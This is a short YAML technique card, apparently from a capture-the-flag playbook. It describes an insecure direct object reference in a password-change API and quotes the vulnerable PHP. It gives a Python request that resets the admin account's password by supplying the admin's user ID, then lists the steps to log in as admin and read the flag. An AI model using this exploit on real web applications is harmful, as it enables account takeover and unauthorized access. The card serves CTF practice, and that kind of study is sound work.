name: idor_password_change
category: web
tags: [idor, privilege_escalation, broken_authorization, password_change]
indicators:
  - "Password change API accepts userId parameter"
  - "Old password verified with session user, but update uses POST userId"
  - "Admin role required to view FLAG"
  - "User ID visible in client-side JavaScript"

tricks:
  - name: "IDOR in password change"
    when: "API verifies old password with session but updates with POST userId"
    how: "Change admin password using own credentials"
    payload: |
      # Vulnerable code:
      # $stmt->execute(['id' => $_SESSION['user_id']]);  // verify old password
      # $stmt->execute(['id' => $_POST['userId']]);      // update password
      
      # Exploit:
      # 1. Register/login as normal user
      # 2. Change password with userId=admin_id
      
      change_pwd_data = {
          "oldPassword": "my_password",      # verified with my session
          "newPassword": "hacked123",
          "confirmPassword": "hacked123",
          "userId": 7                        # admin's id
      }
      requests.post(url + "/api/change_password.php", data=change_pwd_data)

  - name: "Privilege escalation via IDOR"
    when: "FLAG only visible to ADMIN role"
    how: "Change admin password, login as admin"
    payload: |
      # Step 1: Register new user
      # Step 2: Login as new user
      # Step 3: Use IDOR to change admin password
      # Step 4: Login as admin
      # Step 5: Access profile to get FLAG

